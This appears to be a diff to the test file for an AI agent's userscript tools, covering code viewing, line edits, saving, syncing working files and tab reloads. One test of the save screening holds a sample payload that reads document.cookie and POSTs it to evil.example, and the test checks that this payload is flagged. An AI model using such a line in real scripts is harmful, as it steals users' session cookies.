@@ -14,7 +14,7 @@ function memoryFiles(initial = {}) {
     return {files, access: {read: async path => files.get(path) ?? null, write: async (path, content) => { files.set(path, content); }}};
 }
 
-function fixture({files = new Map(), scripts = []} = {}) {
+function fixture({files = new Map(), scripts = [], chrome} = {}) {
     const storage = {
         loadScripts: async () => scripts,
         loadScriptsByConversation: async () => scripts,
@@ -22,13 +22,15 @@ function fixture({files = new Map(), scripts = []} = {}) {
             const index = scripts.findIndex(s => s.id === script.id);
             if (index >= 0) scripts[index] = script; else scripts.unshift(script);
         },
+        updateScript: async (id, changes) => { Object.assign(scripts.find(s => s.id === id) ?? {}, changes); },
+        updateScriptStatus: async (id, status) => { Object.assign(scripts.find(s => s.id === id) ?? {}, {status}); },
         readFile: async (_, path) => files.get(path) ?? null,
         writeFile: async (_, path, content) => { files.set(path, content); },
         fileExists: async (_, path) => files.has(path),
         listFiles: async () => [...files.keys()],
         deleteFile: async (_, path) => { files.delete(path); },
     };
-    const loader = createLoader({mocks: {'src/storage/scripts.ts': storage, 'src/storage/codeFiles.ts': storage}});
+    const loader = createLoader({mocks: {'src/storage/scripts.ts': storage, 'src/storage/codeFiles.ts': storage}, ...(chrome && {globals: {chrome}})});
     return {files, scripts, loader, tools: loader('src/agent/tools/createAgentTools.ts').createAgentTools({conversationId: 'test'})};
 }
 
@@ -270,7 +272,7 @@ test('search finds code in a huge file without reading it', async () => {
     assert.equal((await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: '(unbalanced'})).output.matches, 0);
     const many = (await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: 'const'})).output;
     assert.equal(many.truncated, true);
-    assert.ok(JSON.stringify(many.content).length <= 5000);
+    assert.ok(many.content.length <= 5000);
 });
 
 test('a view stays small enough to read in one result, however long the lines', async () => {
@@ -352,7 +354,7 @@ test('opening a short saved script returns its code straight away', async () => 
 });
 
 test('opening keeps unsaved edits unless told to reset, and never takes another script\'s file', async () => {
-    const linked = savedScript('saved code', {sourcePath: 'scripts/mine.js'});
+    const linked = savedScript('saved code', {sourcePath: 'scripts/mine.js', sourceConversationId: 'test'});
     const {tools, files} = fixture({scripts: [linked], files: new Map([['scripts/mine.js', 'edited code']])});
     const open = input => invoke(tools, 'openScript', {scriptId: 'script-abcdef', ...input}).then(r => r.output);
     const kept = await open();
@@ -439,11 +441,12 @@ test('a script that would delete other scripts\' UI is not saved, but its own cl
     }
 });
 
-test('listings give the size and working file of each script', async () => {
-    const {tools} = fixture({scripts: [savedScript('a\nb', {sourcePath: 'scripts/x.js'})]});
+test('listings give the size of each script, and the working file when this chat holds it', async () => {
+    const {tools} = fixture({scripts: [savedScript('a\nb', {sourcePath: 'scripts/x.js', sourceConversationId: 'test'}), savedScript('c', {id: 'elsewhere', sourcePath: 'scripts/y.js'})]});
     assert.equal((await invoke(tools, 'listScripts')).output.scripts[0].lines, 2);
-    const detailed = (await invoke(tools, 'listScripts', {responseFormat: 'detailed'})).output.scripts[0];
-    assert.equal(detailed.path, 'scripts/x.js');
+    const [here, elsewhere] = (await invoke(tools, 'listScripts', {responseFormat: 'detailed'})).output.scripts;
+    assert.equal(here.path, 'scripts/x.js');
+    assert.equal(elsewhere.path, undefined, "another chat's path names nothing here");
 });
 
 // ── What a later message starts with ────────────────────────
@@ -480,4 +483,186 @@ test('the new file tools need no approval, and saving is still screened', async 
     // Saving still gets the code screened, update or not.
     const assessed = assessAction('saveScript', {path: 'a.js', scriptId: 'id'}, [], 'document.cookie; fetch("https://evil.example", {method: "POST", body: document.cookie})');
     assert.equal(assessed.confirm, true);
+});
+
+// ── Fewer tokens and steps ──────────────────────────────────
+
+test('code reaches the model as plain text, with no escaping or padded numbers', async () => {
+    const code = Array.from({length: 40}, (_, i) => `  el${i}.setAttribute("data-x", 'v${i}');\t// "quoted"`).join('\n');
+    const {tools, loader} = fixture({files: new Map([['a.js', code]])});
+    const runtime = loader('src/agent/tools/toolRuntime.ts').createToolRuntime(tools, {request: 'script', findPrevious: () => undefined});
+    const lines = code.split('\n');
+    const view = await invoke(runtime.tools, 'viewCodeFiles', {path: 'a.js', start_line: 3, end_line: 4});
+    assert.equal(view.projected.type, 'text');
+    assert.equal(view.projected.value, `a.js lines 3-4 of 40; more from start_line 5, or find code with query\n3\t${lines[2]}\n4\t${lines[3]}`);
+    assert.ok(view.projected.value.length < JSON.stringify(view.output).length * 0.85, 'smaller than the escaped JSON');
+    const search = await invoke(runtime.tools, 'viewCodeFiles', {path: 'a.js', query: 'v39'});
+    assert.match(search.projected.value, /^a\.js: 1 match for "v39" \(40 lines\)\n38\t/);
+    const listing = await invoke(runtime.tools, 'viewCodeFiles', {path: 'scripts/'});
+    assert.equal(JSON.parse(listing.projected.value).type, 'directory', 'results without code keep the default form');
+    const edited = await invoke(runtime.tools, 'replaceLines', {path: 'a.js', start_line: 1, end_line: 1, first_line: lines[0], new_text: 'one();'});
+    assert.match(edited.projected.value, /^a\.js: replaced 1 with 1 lines \(40 now\)\n1\tone\(\);/);
+    const failed = await invoke(runtime.tools, 'viewCodeFiles', {path: 'missing.js'});
+    assert.match(failed.projected.value, /No file at missing\.js/);
+});
+
+test('opening a saved script can find the code to change in the same call', async () => {
+    const code = `function main() {\n${numberedCode(3000)}\n  banner.remove();\n}`;
+    const {tools, loader} = fixture({scripts: [savedScript(code)]});
+    const runtime = loader('src/agent/tools/toolRuntime.ts').createToolRuntime(tools, {request: 'script', findPrevious: () => undefined});
+    const {output, projected} = await invoke(runtime.tools, 'openScript', {scriptId: 'script-abcdef', query: 'banner.remove'});
+    assert.equal(output.matches, 1);
+    assert.equal(output.outline, undefined);
+    assert.match(projected.value, /^Opened "Hide Banner!" \(scriptId script-abcdef\) as scripts\/hide-banner\.js: 3003 lines, https:\/\/example\.com\/\*, document_end, paused\./);
+    assert.match(projected.value, /1 match for "banner\.remove":\n3000\t/);
+    assert.match(projected.value, /3002\t {2}banner\.remove\(\);/);
+    assert.ok(projected.value.length < 600);
+});
+
+test('a failed replacement says which lines to use, and replace_all renames', async () => {
+    const {tools, files} = fixture({files: new Map([['a.js', 'function a() {\n    const count = 1;\n    log(count);\n    return count;\n}']])});
+    const edit = input => invoke(tools, 'strReplaceTool', {path: 'a.js', ...input}).then(r => r.output);
+    const spacing = await edit({old_str: 'const count = 1;\n  log(count);', new_str: 'x'});
+    assert.match(spacing.error, /not found/);
+    assert.equal(spacing.similarLines, '2\t    const count = 1;');
+    const repeated = await edit({old_str: 'count', new_str: 'total'});
+    assert.match(repeated.error, /matches 3 times \(lines 2, 3, 4\).*replace_all/);
+    assert.match((await edit({edits: [{old_str: 'a()', new_str: 'b()'}, {old_str: 'count', new_str: 'n'}]})).error, /^Edit 2: .*set all/);
+    assert.ok(files.get('a.js').includes('function a()'), 'a failed batch writes nothing');
+    const renamed = await edit({old_str: 'count', new_str: 'total', replace_all: true});
+    assert.equal(renamed.replaced, 3);
+    assert.equal(files.get('a.js'), 'function a() {\n    const total = 1;\n    log(total);\n    return total;\n}');
+    assert.equal((await edit({edits: [{old_str: 'total', new_str: 'n', all: true}, {old_str: 'a()', new_str: 'b()'}]})).replaced, 4);
+});
+
+test('a failed test run returns its error, and a syntax error its line and the code around it', async () => {
+    let reply = {error: "Uncaught SyntaxError: Unexpected token ')'"};
+    const sendMessage = async message => message.type === 'EXECUTE_SCRIPT' ? reply : {ok: true};
+    const code = 'function main() {\n  const a = 1;\n  log(a));\n  return a;\n}';
+    const {tools} = fixture({files: new Map([['a.js', code]]), chrome: {runtime: {sendMessage}}});
+    const failed = (await invoke(tools, 'executeContentScript', {path: 'a.js'})).output;
+    assert.equal(failed.success, false);
+    assert.match(failed.error, /SyntaxError/);
+    assert.equal(failed.line, 3);
+    assert.match(failed.around, /3\t {2}log\(a\)\);/);
+    assert.match(failed.around, /^1\tfunction main/);
+    reply = {error: 'ReferenceError: log is not defined'};
+    const thrown = (await invoke(tools, 'executeContentScript', {path: 'a.js'})).output;
+    assert.equal(thrown.line, undefined);
+    assert.match(thrown.error, /log is not defined/);
+    reply = {result: undefined};
+    assert.deepEqual(plain((await invoke(tools, 'executeContentScript', {path: 'a.js'})).output), {success: true, result: null});
+    reply = {result: 'Hid 3 banners'};
+    assert.equal((await invoke(tools, 'executeContentScript', {path: 'a.js'})).output, 'Hid 3 banners');
+});
+
+test('a one-off run reports what the browser says went wrong', async () => {
+    const results = [[{documentId: 'd', frameId: 0, error: 'Uncaught Error: boom'}], [{documentId: 'd', frameId: 0, result: 5}]];
+    const {executeOnTab} = createLoader({globals: {chrome: {userScripts: {execute: async () => results.shift()}}}})('src/background/userscripts/executeOnTab.ts');
+    await assert.rejects(executeOnTab(7, 'function main() { throw new Error("boom"); }'), /boom/);
+    assert.equal(await executeOnTab(7, 'function main() { return 5; }'), 5);
+});
+
+test('saving answers once the browser runs the new version, and reload checks it in the tab', async () => {
+    const events = [];
+    const chrome = {
+        runtime: {sendMessage: async message => { events.push(message.type); return {ok: true}; }},
+        tabs: {
+            reload: async tabId => { events.push(`reload ${tabId}`); },
+            get: async () => ({url: 'https://a.com/', title: 'A'}),
+            onUpdated: {addListener: listener => setTimeout(() => listener(7, {status: 'complete'}), 0), removeListener() {}},
+        },
+    };
+    const {tools} = fixture({files: new Map([['scripts/a.js', 'function a() {}']]), chrome});
+    const saved = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', name: 'A', urlMatchPattern: 'https://a.com/*'})).output;
+    assert.deepEqual(events, ['SYNC_SCRIPTS']);
+    assert.equal(saved.reloaded, undefined);
+    const again = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', reload: true})).output;
+    assert.deepEqual(events, ['SYNC_SCRIPTS', 'SYNC_SCRIPTS', 'reload 7']);
+    assert.deepEqual(plain(again.reloaded), {url: 'https://a.com/', title: 'A'});
+    await invoke(tools, 'toggleScript', {scriptId: saved.scriptId, action: 'pause'});
+    assert.equal(events.at(-1), 'SYNC_SCRIPTS');
+});
+
+test('saving claims the tab only to reload it', async () => {
+    const {leaseTabTools, holdsTab} = createLoader()('src/agent/tools/tabLease.ts');
+    const tools = leaseTabTools({saveScript: {execute: async () => 'saved'}}, 'chat', () => 7);
+    await tools.saveScript.execute({path: 'a.js'}, {});
+    assert.equal(holdsTab('chat'), false);
+    await tools.saveScript.execute({path: 'a.js', reload: true}, {});
+    assert.equal(holdsTab('chat'), true);
+});
+
+// ── Working file and saved script in step ───────────────────
+
+test('a save links the script to this chat\'s file, and opening one from elsewhere moves the link here', async () => {
+    const {tools, scripts, loader} = fixture({files: new Map([['scripts/a.js', 'v1']]), scripts: [savedScript('other code', {id: 'from-elsewhere', sourcePath: 'scripts/x.js'})]});
+    const {codeFingerprint} = loader('src/userscripts/workingFile.ts');
+    const {scriptId} = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', name: 'A', urlMatchPattern: 'https://a.com/*'})).output;
+    const mine = scripts.find(s => s.id === scriptId);
+    assert.equal(mine.sourceConversationId, 'test');
+    assert.equal(mine.sourceBase, codeFingerprint('v1'));
+    const opened = (await invoke(tools, 'openScript', {scriptId: 'from-elsewhere'})).output;
+    assert.equal(opened.path, 'scripts/x.js');
+    const moved = scripts.find(s => s.id === 'from-elsewhere');
+    assert.equal(moved.sourceConversationId, 'test');
+    assert.equal(moved.conversationId, 'other-chat', 'it still belongs to the chat it was made in');
+    assert.equal(moved.sourceBase, codeFingerprint('other code'));
+});
+
+test('a missing working file comes back from the saved code, and one left behind follows the saved script', async () => {
+    const files = new Map();
+    const {loader, scripts} = fixture({files, scripts: [savedScript('v2', {sourcePath: 'scripts/a.js', sourceConversationId: 'test'})]});
+    const {syncWorkingFile, codeFingerprint} = loader('src/userscripts/workingFile.ts');
+    const restored = await syncWorkingFile(scripts[0], 'test');
+    assert.deepEqual([restored.path, restored.code, restored.state], ['scripts/a.js', 'v2', 'saved']);
+    assert.equal(files.get('scripts/a.js'), 'v2');
+    assert.equal(scripts[0].sourceBase, codeFingerprint('v2'), 'the shared code is fixed once known');
+
+    // Saved again elsewhere (a hand edit, say): the untouched file follows.
+    Object.assign(scripts[0], {code: 'v3'});
+    assert.equal((await syncWorkingFile(scripts[0], 'test')).state, 'saved');
+    assert.equal(files.get('scripts/a.js'), 'v3');
+
+    // The file's own edits stay; both sides moving is reported, not resolved.
+    files.set('scripts/a.js', 'v3 + agent edit');
+    assert.equal((await syncWorkingFile(scripts[0], 'test')).state, 'unsaved');
+    Object.assign(scripts[0], {code: 'v4'});
+    const diverged = await syncWorkingFile(scripts[0], 'test');
+    assert.equal(diverged.state, 'diverged');
+    assert.equal(files.get('scripts/a.js'), 'v3 + agent edit');
+});
+
+test('saving never quietly undoes a change made elsewhere', async () => {
+    const files = new Map([['scripts/a.js', 'v1']]);
+    const {tools, scripts, loader} = fixture({files});
+    const {codeFingerprint} = loader('src/userscripts/workingFile.ts');
+    const {scriptId} = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', name: 'A', urlMatchPattern: 'https://a.com/*'})).output;
+    // The user edits the saved script by hand while the file keeps the old code.
+    Object.assign(scripts[0], {code: 'hand edit'});
+    const stale = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', scriptId})).output;
+    assert.match(stale.error, /undo that change.*openScript/);
+    assert.equal(scripts[0].code, 'hand edit');
+    files.set('scripts/a.js', 'v1 + agent edit');
+    const opened = (await invoke(tools, 'openScript', {scriptId})).output;
+    assert.match(opened.diverged, /reset.*overwrite/);
+    assert.match((await invoke(tools, 'saveScript', {path: 'scripts/a.js'})).output.error, /Not saved/);
+    assert.equal(scripts[0].code, 'hand edit');
+    const forced = (await invoke(tools, 'saveScript', {path: 'scripts/a.js', overwrite: true})).output;
+    assert.equal(forced.success, true);
+    assert.equal(scripts[0].code, 'v1 + agent edit');
+    assert.equal(scripts[0].sourceBase, codeFingerprint('v1 + agent edit'));
+    // Edits only the file has save as before.
+    files.set('scripts/a.js', 'v2');
+    assert.equal((await invoke(tools, 'saveScript', {path: 'scripts/a.js'})).output.success, true);
+});
+
+test('a run starts with each saved change\'s path and whether its file is ahead', () => {
+    const note = codeFiles.codeContextNote([], [
+        {id: 'id-1', name: 'A', lines: 9, path: 'scripts/a.js', unsaved: true, diverged: false},
+        {id: 'id-2', name: 'B', lines: 4},
+    ]);
+    assert.ok(note.includes('{"scriptId":"id-1","name":"A","lines":9,"path":"scripts/a.js","unsaved":true}'));
+    assert.ok(note.includes('{"scriptId":"id-2","name":"B","lines":4}'));
+    assert.match(note, /Without a path, openScript first/);
 });
